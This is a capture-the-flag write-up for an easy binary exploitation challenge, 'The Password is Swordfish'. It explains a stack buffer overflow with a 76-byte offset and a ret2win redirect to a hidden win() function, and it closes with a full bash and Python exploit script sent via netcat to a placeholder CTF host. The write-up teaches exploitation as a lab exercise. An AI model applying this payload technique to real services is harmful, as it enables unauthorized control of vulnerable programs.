# The Password is Swordfish

> **Category:** Binary Exploitation (Pwn)  
> **Difficulty:** Easy  

## Description

The challenge provided a password-protected ZIP file containing the vulnerable binary. The objective was to analyze the program, identify the vulnerability, and gain control of the execution flow to reach the hidden `win()` function, which prints the flag on the remote server.

Unlike traditional password bypass challenges, the solution required exploiting a memory corruption vulnerability rather than discovering the actual password.

---

## Challenge Files

```
public.zip
```

Password:

```
infected
```

Contents:

```
vault
```

---

# Initial Analysis

After extracting the binary, the first step was to inspect its security protections.

```bash
checksec vault
```

Example output:

```
RELRO           Partial RELRO
Canary          No canary found
NX              Enabled
PIE             No PIE
```

Important observations:

- No Stack Canary
- NX Enabled
- No PIE

The absence of PIE means that function addresses remain static, making it possible to jump directly to internal functions.

---

# Static Analysis

The binary was loaded into Ghidra to inspect its functions.

A hidden function named:

```
win()
```

was discovered.

Its purpose was simply:

```c
open("/flag.txt");
read(...);
puts(flag);
```

Therefore, the goal became redirecting execution directly to this function.

---

# Vulnerability

The vulnerable code accepted user input without validating its length.

By supplying a specially crafted payload, it was possible to overwrite:

- local variables
- saved frame pointer
- saved return address

This is a classic **stack-based buffer overflow**.

---

# Finding the Offset

After testing different payload lengths locally, the correct layout was determined:

```
76 bytes
```

followed by:

```
4-byte overwrite
```

then:

```
saved RBP
```

finally:

```
return address
```

The target return address was replaced with:

```
win()
```

whose address was:

```
0x401b85
```

Because PIE was disabled, this address remained constant.

---

# Payload Structure

```
-1
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
0x4c000000
BBBBBBBB
0x401b85
```

Structure:

```
Input:
    "-1"

Buffer:
    "A" * 76

Overwrite:
    0x4c000000

Saved RBP:
    "B"*8

Return Address:
    win()
```

When the vulnerable function returned, execution jumped directly into `win()`.

---

# Local Verification

The exploit was first executed locally.

```
python3 solve.py | ./vault
```

The program printed:

```
Error: could not read flag.
```

This confirmed the exploit was successful.

The reason no flag appeared locally is because the local binary does not include:

```
/flag.txt
```

Execution had already reached `win()` successfully.

---

# Remote Exploitation

The same payload was then sent to the remote challenge.

```
python3 solve.py | nc HOST PORT
```

The remote server contained the real flag file, allowing `win()` to read and display it.

---

# Exploit Script

```bash
#!/usr/bin/env bash
set -euo pipefail

# ==============================
# FluidSec Vault exploit desde 0
# ==============================

HOST="https://INSTANCE.ctf.ae"
PORT="443"

ZIP_FILE="public.zip"
ZIP_PASS="infected"
BIN_NAME="vault"

echo "[+] FluidSec Vault exploit"

for tool in python3 unzip nc; do
    if ! command -v "$tool" >/dev/null 2>&1; then
        echo "[-] Falta instalar: $tool"
        exit 1
    fi
done

if [ -f "$ZIP_FILE" ]; then
    echo "[+] Extrayendo $ZIP_FILE con password '$ZIP_PASS'..."
    unzip -P "$ZIP_PASS" -o "$ZIP_FILE" >/dev/null
fi

if [ ! -f "$BIN_NAME" ]; then
    FOUND_BIN="$(find . -type f -name "$BIN_NAME" | head -n 1 || true)"
    if [ -z "$FOUND_BIN" ]; then
        echo "[-] No encontre el binario '$BIN_NAME'."
        exit 1
    fi
    cp "$FOUND_BIN" "./$BIN_NAME"
fi

chmod +x "$BIN_NAME"

cat > solve.py <<'PY'
#!/usr/bin/env python3
from struct import pack
import sys

p64 = lambda x: pack("<Q", x)

win = 0x401b85

payload  = b"-1\n"
payload += b"A" * 76
payload += b"\x4c\x00\x00\x00"
payload += b"B" * 8
payload += p64(win)
payload += b"\n"

sys.stdout.buffer.write(payload)
PY

chmod +x solve.py

echo "[+] Probando exploit local..."
python3 solve.py | ./vault || true

echo
echo "[+] Si local aparece:"
echo "Error: could not read flag."
echo
echo "El exploit funcionó correctamente."

echo "[+] Enviando exploit remoto..."
python3 solve.py | nc "$HOST" "$PORT"
```

---

# Exploitation Flow

```
ZIP
      │
      ▼
Extract binary
      │
      ▼
Analyze protections
      │
      ▼
Find hidden win()
      │
      ▼
Locate buffer overflow
      │
      ▼
Calculate offset
      │
      ▼
Overwrite RIP
      │
      ▼
Jump to win()
      │
      ▼
Read /flag.txt
      │
      ▼
Capture Flag
```

---

# Skills Demonstrated

- Binary exploitation
- Reverse engineering with Ghidra
- Stack buffer overflow analysis
- Return address overwrite
- Function redirection
- Payload construction
- Linux binary analysis
- Local exploit development
- Remote exploitation using Netcat
- Basic pwning methodology

---

# Lessons Learned

This challenge demonstrates how the absence of modern exploit mitigations such as Stack Canaries and PIE can allow an attacker to redirect execution to privileged code already present in the binary. By identifying the correct overflow offset and the fixed address of the hidden `win()` function, it was possible to gain code execution without injecting shellcode, leveraging a classic **ret2win** technique.

---
